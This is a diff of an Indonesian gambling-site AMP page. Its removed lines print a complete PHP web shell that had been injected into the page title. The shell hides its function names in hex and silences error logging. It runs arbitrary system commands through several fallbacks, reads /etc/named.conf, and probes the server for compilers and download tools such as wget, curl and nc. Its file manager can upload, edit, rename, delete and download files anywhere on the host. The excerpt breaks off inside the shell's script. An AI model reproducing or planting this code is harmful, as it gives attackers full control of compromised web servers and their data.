@@ -1,2611 +1,1830 @@
+
 <!doctype html>
 <html lang="id" amp i-amphtml-binding i-amphtml-layout i-amphtml-no-boilerplate transformed="self;v=1" itemscope="itemscope" itemtype="https://schema.org/WebPage">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Slot Hoki: Situs Judi S<?php
-
-$shellName = 'nasa.gov';
-$logo = 'https://cdn-icons-png.flaticon.com/512/4392/4392477.png';
-$func = ["7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "7363616e646972", "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e", "6469726e616d65", "6469736b5f746f74616c5f7370616365", "6469736b5f667265655f7370616365", "696e695f676574", "707265675f6d617463685f616c6c", "706f7369785f6765747077756964", "706f7369785f6765746772676964", "70617468696e666f", "66696c656f776e6572", "66696c6567726f7570", "66696c6574797065", "676574486f73744e616d65", "676574486f737442794e616d65", "737562737472", "737472737472", "696e695f736574", "66696c65", "7374725f7265706c616365", "6578706c6f6465", "6576616c", "6f625f7374617274", "66756e6374696f6e5f657869737473", "6572726f725f7265706f7274696e67", "7365745f74696d655f6c696d6974", "636c656172737461746361636865", "646174655f64656661756c745f74696d657a6f6e655f736574", "666c757368", "7374726c656e", "7472696d", "656d707479", "6973736574", "66696c657065726d73", "7374726c656e", "636f756e74", "726f756e64", "6d696d655f636f6e74656e745f74797065", "6765745f63757272656e745f75736572", "6765746d79756964", "6765746d79676964", "706f7369785f67657465756964", "706f7369785f67657465676964"];
-
-for ($i = 0; $i < count($func); $i++) {
-	$func[$i] = dehex($func[$i]);
-}
-
-session_start();
-$func[50](0);
-@$func[51](0);
-@$func[52]();
-@$func[43]('error_log', null);
-@$func[43]('log_errors',0);
-@$func[43]('max_execution_time',0);
-@$func[43]('output_buffering',0);
-@$func[43]('display_errors', 0);
-$func[53]("Asia/Jakarta");
-
-if (isset($_GET['dir'])) {
-	$dir = $_GET['dir'];
-	$func[3]($dir);
-} else {
-	$dir = $func[2]();
-}
-	
-$d0mains = @$func[44]("/etc/named.conf", false);
-if (!$d0mains) {
-	$dom = "<font class='text-danger'>Can't Read /etc/named.conf</font>";
-} else { 
-	$count = 0;
-	foreach ($d0mains as $d0main) {
-		if (@$func[43]($d0main, "zone")) {
-			$func[32]('#zone "(.*)"#', $d0main, $domains);
-			$func[54]();
-			if ($func[55]($func[56]($domains[1][0])) > 2){
-				$func[54]();
-				$count++;
-			}
-		}
-	}
-	$dom = "<font class='text-success'>$count Domain</font>";
-}
-
-$dir = $func[45]("\\", "/", $dir);
-$scdir = $func[46]("/", $dir);
-$total = $func[29]($dir);
-$free = $func[30]($dir);
-$pers =  (int) ($free / $total * 100);
-$ds = @$func[31]("disable_functions");
-$show_ds = (!empty($ds)) ? "<font class='text-danger'>$ds</font>" : "<font class='text-success'>All function is accessible</font>";
-
-$cmd_uname = exe("uname -a");
-$uname = $func[49]('php_uname') ? $func[41](@$func[0](), 0, 120) : ($func[55]($cmd_uname) > 0 ? $cmd_uname : '( php_uname ) Function Disabled !');
-
-if (strtolower($func[41](PHP_OS, 0, 3)) == "win") {
-	$sys = "win";
-} else {
-	$sys = "unix";
-}
-
-if (isset($_GET['do'])) {
-	$do = $_GET['do'];
-	if ($do == 'delete') {
-		if ($func[12]($dir)) {
-			if (deleter($dir)) {
-				flash("File/Folder deleted successfully!", "Success", "success", "?dir=" . dirname($dir));
-			} else {
-				flash("File/Folder failed to delete!", "Failed", "danger");
-			}
-		} else {
-			flash("File/Folder is doesn't exist!", "Failed", "warning");
-		}
-	} else if ($do == 'download') {
-		if ($func[12]($dir)) {
-			header("Content-Type: application/octet-stream");
-			header("Content-Transfer-Encoding: Binary");
-			header("Content-Length: " . $func[10]($dir));
-			header("Content-disposition: attachment; filename=\"".basename($dir)."\"");
-		} else {
-			flash("File is doesn't exist!", "Failed", "warning");
-		}
-	}
-} else {
-	$do = 'filesman';
-	$title = 'Files Manager';
-	$icon = 'archive';
-}
-
-((isset($_POST["foldername"])) ? ($func[12]("$dir/{$_POST['foldername']}") ? flash("Folder name is exist!", "Failed", "warning") : ($func[15]("$dir/{$_POST['foldername']}") ? flash("Folder created successfully!", "Success", "success") : flash("Folder failed to create!", "Failed", "danger"))) : null);
-
-((isset($_POST["filename"]) && isset($_POST['filecontent'])) ? ($func[12]("$dir/{$_POST['filename']}") ? flash("File name is exist!", "Failed", "warning") : ($func[13]("$dir/{$_POST['filename']}", $_POST['filecontent']) ? flash("File created successfully!", "Success", "success") : flash("File failed to create!", "Failed", "danger"))) : null);
-
-((isset($_POST["newname"]) && isset($_POST['oldname'])) ? ($func[12]("$dir/{$_POST['newname']}") ? flash("File/Folder name is exist!", "Failed", "warning") : ($func[16]("$dir/{$_POST['oldname']}", $_POST['newname']) ? flash("File/Folder renamed successfully!", "Success", "success") : flash("File/Folder failed to rename!", "Failed", "danger"))) : null);
-
-((isset($_POST["filename"]) && isset($_POST['content'])) ? ($func[13]("$dir/{$_POST['filename']}", $_POST['content']) ? flash("File saved successfully!", "Success", "success") : flash("File failed to save!", "Failed", "danger")) : null);
-
-if (isset($_FILES["uploadfile"])) {
-	$n = $_FILES["uploadfile"]["name"];
-	for ($i = 0; $i < count($n); $i++) {
-		if ($func[11]($_FILES["uploadfile"]["tmp_name"][$i], $n[$i])) {
-			flash("File uploaded successfully!", "Success", "success");
-		} else {
-			flash("File failed to upload!", "Failed", "danger");
-		}
-	}
-}
-
-if (@$func[31]('open_basedir')) {
-	$basedir_data = @$func[31]('open_basedir');
-	if ($func[55]($basedir_data) > 120){
-		$open_b = "<font class='text-success'>" . $func[41]($basedir_data, 0, 120) . "...</font>";
-	} else {
-		$open_b = '<font class="text-success">' . $basedir_data . '</font>';
-	}
-} else {
-	$open_b = '<font class="text-warning">NONE</font>';
-}
-
-if (!$func[49]('posix_getegid')) {
-	$user = $func[49]("get_current_user") ? @$func[64]() : "????";
-	$uid = $func[49]("getmyuid") ? @$func[65]() : "????";
-	$gid = $func[49]("getmygid") ? @$func[66]() : "????";
-	$group = "?";
-} else {
-	$uid = $func[49]("posix_getpwuid") && $func[49]("posix_geteuid") ? @$func[33]($func[67]()) : ["name" => "????", "uid" => "????"];
-	$gid = $func[49]("posix_getgrgid") && $func[49]("posix_getegid") ? @$func[34]($func[68]()) : ["name" => "????", "gid" => "????"];
-	$user = $uid['name'];
-	$uid = $uid['uid'];
-	$group = $gid['name'];
-	$gid = $gid['gid'];
-}
-
-if ($sys == 'unix') {
-	if (!@$func[31]('safe_mode')) {
-		if ($func[55](exe("id")) > 0) {
-			$userful = ['gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl'];
-			$x = 0;
-			foreach ($userful as $i) {
-				if (which($i)) {
-					$x++;
-					$useful .= $i . ', ';
-				}
-			}
-			if ($x == 0) {
-				$useful = '--------';
-			}
-			$downloaders = ['wget','fetch','lynx','links','curl','get','lwp-mirror'];
-			$x = 0;
-			foreach($downloaders as $i) {
-				if (which($i)) {
-					$x++;
-					$downloader .= $i . ', ';
-				}
-			}
-			if ($x == 0) {
-				$downloader = '--------';
-			}
-		}
-	}
-}
-
-function hex($str) {
-	global $func;
-	$r = "";
-	for ($i = 0; $i < $func[55]($str); $i++) {
-		$r .= dechex(ord($str[$i]));
-	}
-	return $r;
-}
-
-function dehex($str) {
-	$r = "";
-	$len = (strlen($str) - 1);
-	for ($i = 0; $i < $len; $i += 2) {
-		$r .= chr(hexdec($str[$i].$str[$i + 1]));
-	}
-	return $r;
-}
-
-function formatSize($bytes) {
-	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
-	for ( $i = 0; $bytes >= 1024 && $i < ( count( $types ) - 1 ); $bytes /= 1024, $i++ );
-	return( round( $bytes, 2 )." ".$types[$i] );
-}
-
-function perms($file) {
-	global $func;
-	$perms = fileperms($file);
-	if (($perms & 0xC000) == 0xC000){
-		$info = 's';
-	}elseif (($perms & 0xA000) == 0xA000){
-		$info = 'l';
-	}elseif (($perms & 0x8000) == 0x8000){
-		$info = '-';
-	}elseif (($perms & 0x6000) == 0x6000){
-		$info = 'b';
-	}elseif (($perms & 0x4000) == 0x4000){
-		$info = 'd';
-	}elseif (($perms & 0x2000) == 0x2000){
-		$info = 'c';
-	}elseif (($perms & 0x1000) == 0x1000){
-	$info = 'p';
-	}else{
-		$info = 'u';
-	}
-	$info .= (($perms & 0x0100) ? 'r' : '-');
-	$info .= (($perms & 0x0080) ? 'w' : '-');
-	$info .= (($perms & 0x0040) ?
-	(($perms & 0x0800) ? 's' : 'x' ) :
-	(($perms & 0x0800) ? 'S' : '-'));
-	$info .= (($perms & 0x0020) ? 'r' : '-');
-	$info .= (($perms & 0x0010) ? 'w' : '-');
-	$info .= (($perms & 0x0008) ?
-	(($perms & 0x0400) ? 's' : 'x' ) :
-	(($perms & 0x0400) ? 'S' : '-'));
-	$info .= (($perms & 0x0004) ? 'r' : '-');
-	$info .= (($perms & 0x0002) ? 'w' : '-');
-	$info .= (($perms & 0x0001) ?
-	(($perms & 0x0200) ? 't' : 'x' ) :
-	(($perms & 0x0200) ? 'T' : '-'));
-	return $func[41](sprintf('%o', $perms), -4) . ' >> ' .$info;
-}
-
-function exe($in) {
-	global $func;
-	$out = '';
-	try {
-		if ($func[49]('exec')) {
-			@$func[23]($in, $out);
-			$out = @join("\n", $out);
-		} elseif ($func[49]('passthru')) {
-			$func[48]();
-			@passthru($in);
-			$out = $func[27]();
-		} elseif($func[49]('system')) {
-			$func[48]();
-			@system($in);
-			$out = $func[27]();
-		} elseif ($func[49]('shell_exec')) {
-			$out = $func[25]($in);
-		} elseif ($func[49]("popen") && $func[49]("pclose")) {
-			if (is_resource($f = @popen($in,"r"))) {
-				$out = "";
-				while(!@feof($f))
-				$out .= fread($f, 1024);
-				pclose($f);
-			}
-		} elseif ($func[49]('proc_open')) {
-			$pipes = [];
-			$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
-			$out = @stream_get_contents($pipes[1]);
-		} elseif (class_exists('COM')) {
-			$ws = new COM('WScript.shell');
-			$exec = $ws->exec('cmd.exe /c '.$in);
-			$stdout = $exec->StdOut();
-			$out = $stdout->ReadAll();
-		}
-	} catch(Exception $e) {}
-	return $out;
-}
-
-function checkName($name) {
-	global $func;
-	if ($func[55]($name) > 18) {
-		return $func[41]($name, 0, 18) . "...";
-	}
-	return $name;
-}
-
-function checkPerm($dir, $perm) {
-	global $func;
-	$perm = explode('>>', $perm);
-	if ($func[8]($dir)) {
-		return "<font class='text-success'>".$perm[0]."</font> >> <font class='text-success'>".$perm[1]."</font>";
-	} elseif (!$func[9]($dir)) {
-		return "<font class='text-danger'>".$perm[0]."</font> >> <font class='text-danger'>".$perm[1]."</font>";
-	} else {
-		return "<font class='text-secondary'>".$perm[0]."</font> >> <font class='text-secondary'>".$perm[1]."</font>";
-	}
-}
-
-function getowner($item) {
-	global $func;
-	if ($func[49]("posix_getpwuid")) {
-		$downer = @$func[33](fileowner($item));
-		$downer = $downer['name'];
-	} else {
-		$downer = fileowner($item);
-	}
-	if ($func[49]("posix_getgrgid")) {
-		$dgrp = @$func[34](filegroup($item));
-		$dgrp = $dgrp['name'];
-	} else {
-		$dgrp = filegroup($item);
-	}
-	return $downer . '/' . $dgrp;
-}
-
-function geticon($file) {
-	global $func;
-	$ext = strtolower($func[35]($file, PATHINFO_EXTENSION));
-	if ($ext == 'php' || $ext == 'html' || $ext == 'js' || $ext == 'css' || $ext == 'py' || $ext == 'perl' || $ext == 'sh') {
-		return 'file-code';
-	} else if ($ext == 'pdf') {
-		return 'file-pdf';
-	} else if ($ext == 'txt') {
-		return 'file-alt';
-	} else if ($ext == 'csv') {
-		return 'file-csv';
-	} else if ($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif') {
-		return 'file-image';
-	} else if ($ext == 'mp4' || $ext == '3gp' || $ext == 'mkv') {
-		return 'file-video';
-	} else if ($ext == 'docx' || $ext == 'doc' || $ext == 'docm') {
-		return 'file-word';
-	} else if ($ext == 'ppt' || $ext == 'pptx') {
-		return 'file-powerpoint';
-	} else if ($ext == 'xlsx' || $ext == 'xlsb' || $ext == 'xlsm' || $ext == 'xltx' || $ext == 'xltm') {
-		return 'file-excel';
-	} else if ($ext == 'mp3' || $ext == 'wav') {
-		return 'file-audio';
-	} else if ($ext == 'sql' || $ext == 'db') {
-		return 'database';
-	} else if ($ext == 'zip' || $ext == 'tar' || $ext == 'gz' || $ext == 'tar.gz' || $ext == '7z' || $ext == 'bz2') {
-		return 'file-archive';
-	} else {
-		return 'file';
-	}
-}
-
-function which($p) {
-	global $func;
-	$path = exe('which ' . $p);
-	if (!empty($path)) {
-		return $func[55]($path);
-	}
-	return false;
-}
-
-function flash($message, $status, $class, $redirect = false) {
-	if (!empty($_SESSION["message"])) {
-		unset($_SESSION["message"]);
-	}
-	if (!empty($_SESSION["class"])) {
-		unset($_SESSION["class"]);
-	}
-	if (!empty($_SESSION["status"])) {
-		unset($_SESSION["status"]);
-	}
-	$_SESSION["message"] = $message;
-	$_SESSION["class"] = $class;
-	$_SESSION["status"] = $status;
-	if ($redirect) {
-		header('Location: ' . $redirect);
-		exit();
-	}
-	return true;
-}
-
-function clear() {
-	if (!empty($_SESSION["message"])) {
-		unset($_SESSION["message"]);
-	}
-	if (!empty($_SESSION["class"])) {
-		unset($_SESSION["class"]);
-	}
-	if (!empty($_SESSION["status"])) {
-		unset($_SESSION["status"]);
-	}
-	return true;
-}
-
-function deleter($d) {
-	global $func;
-	if (trim($func[35]($d, PATHINFO_BASENAME), '.') === '') {
-		return false;
-	};
-	if ($func[6]($d)) {
-		array_map("deleter", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
-		rmdir($d);
-		return true;
-	} else {
-		unlink($d);
-		return true;
-	}
-	return false;
-}
-
-$scandir = $func[21]($dir);
-
-?>
-<!doctype html>
-<html lang="en">
-<head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
-	<title><?= $shellName ?></title>
-</head>
-<body>
-	<div class="container-lg">
-		
-		<nav class="navbar navbar-light bg-light">
-			<div class="container-fluid">
-				<a class="navbar-brand" href="?">
-					<img src="<?= $logo ?>" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
-					<?= $shellName ?>
-				</a>
-			</div>
-		</nav>
-		
-		<?php if (isset($_SESSION['message'])) : ?>
-		<div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show my-3" role="alert">
-			<strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
-			<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
-		</div>
-		<?php endif; clear(); ?>
-
-		<div id="tool">
-			<div class="d-flex justify-content-center flex-wrap my-3">
-				<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
-				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
-				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
-				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
-			</div>
-			
-			<div class="row">
-				<div class="col-md-12">
-					<div class="collapse" id="upload" data-bs-parent="#tool">
-						<div class="card card-body border-dark mb-3">
-							<div class="row">
-								 <div class="col-md-6">
-									<form action="" method="post" enctype="multipart/form-data">
-										<div class="input-group">
-											<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
-											<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
-										</div>
-									</form>
-								 </div>
-							</div>
-						</div>
-					</div>
-				</div>
-				<div class="col-md-12">
-					<div class="collapse" id="newfile" data-bs-parent="#tool">
-						<div class="card card-body border-dark mb-3">
-							<div class="row">
-								<div class="col-md-6">
-									<form action="" method="post">
-										<div class="mb-3">
-											<label class="form-label">File Name</label>
-											<input type="text" class="form-control" name="filename" placeholder="bapakmu.txt">
-										</div>
-										<div class="mb-3">
-											<label class="form-label">File Content</label>
-											<textarea class="form-control" rows="5" name="filecontent"></textarea>
-										</div>
-										<button type="submit" class="btn btn-outline-dark">Create</button>
-									</form>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-				<div class="col-md-12">
-					<div class="collapse" id="newfolder" data-bs-parent="#tool">
-						<div class="card card-body border-dark mb-3">
-							<div class="row">
-								<div class="col-md-6">
-									<form action="" method="post">
-										<div class="mb-3">
-											<label class="form-label">Folder Name</label>
-											<input type="text" class="form-control" name="foldername" placeholder="bapakmu">
-										</div>
-										<button type="submit" class="btn btn-outline-dark">Create</button>
-									</form>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-
-		<div class="row">
-			<div class="col-md-12">
-				<div class="card border-dark">
-					<div class="card-body">
-						<h5><i class="fas fa-angry"></i> Server Information </h5>
-						<div class="table-responsive">
-							<table class="table table-hover text-nowrap">
-								<tr>
-									<td>Operating System</td>
-									<td> : <?= $uname ?></td>
-								</tr>
-								<tr>
-									<td>PHP Version</td>
-									<td> : <?= $func[1]() ?></td>
-								</tr>
-
-								<tr>
-									<td>Storage</td>
-									<td class="d-flex">: Total = <?= formatSize($total) ?>, Free = <?= formatSize($free) ?> [<?= $pers ?>%]</td>
-								</tr>
-
-								<tr>
-									<td>Disable Functions</td>
-									<td>: <?= $show_ds ?></td>
-								</tr>
-
-								<tr>
-									<td colspan="2">CURL : <?= $func[49]('curl_version') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | SSH2 : <?= $func[49]('ssh2_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Magic Quotes : <?= $func[49]('get_magic_quotes_gpc') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MySQL : <?= $func[49]('mysql_get_client_info') || class_exists('mysqli') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MSSQL : <?= $func[49]('mssql_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | PostgreSQL : <?= $func[49]('pg_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Oracle : <?= $func[49]('oci_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?></td>
-								</tr>
-								<tr>
-									<td colspan="2">Safe Mode : <?= @$func[31]('safe_mode') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir : <?= @$func[31]('safe_mode_exec_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_exec_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?> | Safe Mode Include Dir : <?= @$func[31]('safe_mode_include_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_include_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?></td>
-								</tr>
-							</table>
-						</div>
-					</div>
-				</div>
-			</div>
-			<div class="col-md-12 my-3">
-				<div class="card border-dark">
-					<div class="card-body">
-						<h5><i class="fas fa-angry"></i> Path </h5>
-						<nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '>';">
-							<ol class="breadcrumb">
-								<?php
-									$numDir = count($scdir);
-									foreach ($scdir as $id => $pat) {
-										if ($pat == '' && $id == 0) {
-											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/">/</a></li>';
-											continue;
-										}
-										if ($pat == '') continue;
-										if ($id + 1 == $numDir) {
-											echo '<li class="breadcrumb-item active" aria-current="page">'.$pat.'</li>';
-										} else {
-											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=';
-											for ($i = 0; $i <= $id; $i++) {
-												echo "$scdir[$i]";
-												if ($i != $id) echo "/";
-											}
-											echo '">'.$pat.'</a></li>';
-										}
-									}
-								?>
-							</ol>
-						</nav>
-						[ <?= checkPerm($dir, perms($dir)) ?> ]
-					</div>
-				</div>
-			</div>
-			<div class="col-md-12" id="main">
-				<div class="card border-dark overflow-auto">
-					<div class="card-body">
-						<h5><i class="fa fa-<?= $icon ?>"></i> <?= $title ?></h5>
-						<?php if ($do == 'view') : ?>
-							<h1>Anjing</h1>
-						<?php else: ?>
-							<?php if ($func[9]($dir)) : ?>
-								<div class="table-responsive">
-									<table class="table table-hover text-nowrap">
-										<thead>
-											<tr>
-												<th>Name</th>
-												<th>Type</th>
-												<th>Size</th>
-												<th>Last Modified</th>
-												<th>Owner/Group</th>
-												<th>Permission</th>
-												<th>Action</th>
-											</tr>
-										</thead>
-										<tbody>
-											<?php
-												foreach ($scandir as $item) :
-													if (!$func[6]($dir . '/' . $item)) continue;
-											?>
-												<tr>
-													<td>
-														<?php if ($item === '..') : ?>
-														<a href="?dir=<?= $func[28]($dir); ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
-														<?php elseif ($item === '.') :  ?>
-														<a href="?dir=<?= $dir; ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
-														<?php else : ?>
-														<a href="?dir=<?= $dir . '/' . $item ?>" class="text-decoration-none text-dark"><i class="fa fa-folder"></i> <?= checkName($item); ?></a>
-														<?php endif; ?>
-													</td>
-													<td><?= $func[38]($item) ?></td>
-													<td class="align-middle">--</td>
-													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
-													<td><?= getowner($item) ?></td>
-													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
-													<td>
-														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="'.$item.'"' ?>><i class="fa fa-edit"></i></button>
-														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="'.$dir . '/' . $item.'"'?>><i class="fa fa-trash-alt"></i></button>
-													</td>
-												</tr>
-											<?php endforeach; ?>
-											<?php
-												foreach ($scandir as $item) :
-													if (!$func[7]($dir . '/' . $item)) continue;
-											?>
-												<tr>
-													<td><a data-bs-toggle="modal" href="#viewModal" role="button" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>" class="text-dark text-decoration-none"><i class="fa fa-<?= geticon($item) ?>"></i> <?= checkName($item); ?></a></td>
-													<td><?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?></td>
-													<td><?= formatSize($func[10]($item)) ?></td>
-													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
-													<td><?= getowner($item) ?></td>
-													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
-													<td>
-														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
-														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#viewModal" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>"><i class="fa fa-file-signature"></i></button>
-														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#downloadModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-download"></i></button>
-														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-trash-alt"></i></button>
-													</td>
-												</tr>
-											<?php endforeach; ?>
-										</tbody>
-									</table>
-								</div>
-							<?php else: ?>
-								<font class="text-danger">Can't read this directory!</font>
-							<?php endif; ?>
-						<?php endif; ?>
-					</div>
-				</div>
-			</div>
-			<div class="col-md-12 my-3">
-				<div class="card border-dark">
-					<div class="card-body">
-						Copyright kontolmu@gmail.com <span class="float-end">Coded by <span class="text-muted">bapakmu</span></span>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-	
-	<div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
-	  <div class="modal-dialog modal-dialog-centered">
-	    <div class="modal-content">
-	      <div class="modal-header">
-	        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
-	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-	      </div>
-	      <form method="post" id="rename-form">
-		      <div class="modal-body">
-		          <div class="mb-3">
-		            <label for="newname" class="col-form-label">New Name:</label>
-		            <input type="text" class="form-control" name="newname" id="newname">
-		          </div>
-		      </div>
-		      <div class="modal-footer">
-		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-		        <button type="submit" class="btn btn-primary">Rename</button>
-		      </div>
-        </form>
-	    </div>
-	  </div>
-	</div>
-	
-	<div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
-	  <div class="modal-dialog modal-dialog-centered">
-	    <div class="modal-content">
-	      <div class="modal-header">
-	        <h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
-	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-	      </div>
-	      <div class="modal-body">
-	        Are you sure want to delete this?
-	      </div>
-	      <div class="modal-footer">
-	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-	        <a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
-	      </div>
-	      
-	    </div>
-	  </div>
-	</div>
-	
-	<div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
-	  <div class="modal-dialog modal-dialog-centered">
-	    <div class="modal-content">
-	      <div class="modal-header">
-	        <h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
-	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-	      </div>
-	      <div class="modal-body">
-	        Are you sure want to download this?
-	      </div>
-	      <div class="modal-footer">
-	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-	        <a href="" class="btn btn-danger" id="download-confirm">Download</a>
-	      </div>
-	      
-	    </div>
-	  </div>
-	</div>
-	
-	<div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
-	  <div class="modal-dialog modal-dialog-centered">
-	    <div class="modal-content">
-	      <div class="modal-header">
-	        <h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
-	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-	      </div>
-	      <form action="" method="post">
-		      <div class="modal-body">
-		        <div class="mb-3">
-	            <label for="content" class="col-form-label">Content:</label>
-	            <textarea class="form-control" id="content" rows="15" name="content"></textarea>
-	          </div>
-		      </div>
-		      <div class="modal-footer">
-		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-		        <button type="submit" class="btn btn-primary">Save</button>
-		      </div>
-	      </form>
-	    </div>
-	  </div>
-	</div>
-	
-	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
-	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
-	<script>
-		var renameModal = document.getElementById('renameModal')
-		var deleteModal = document.getElementById('deleteModal')
-		var viewModal = document.getElementById('viewModal')
-		var downloadModal = document.getElementById('downloadModal')
-		
-		renameModal.addEventListener('show.bs.modal', function (event) {
-			var button = event.relatedTarget
-			var name = button.getAttribute('data-bs-name')
-			var modalTitle = renameModal.querySelector('.modal-title')
-			var modalBodyInput = renameModal.querySelector('.modal-body input')
-			var hiddenInput = document.createElement('input')
-			hiddenInput.type = "hidden";
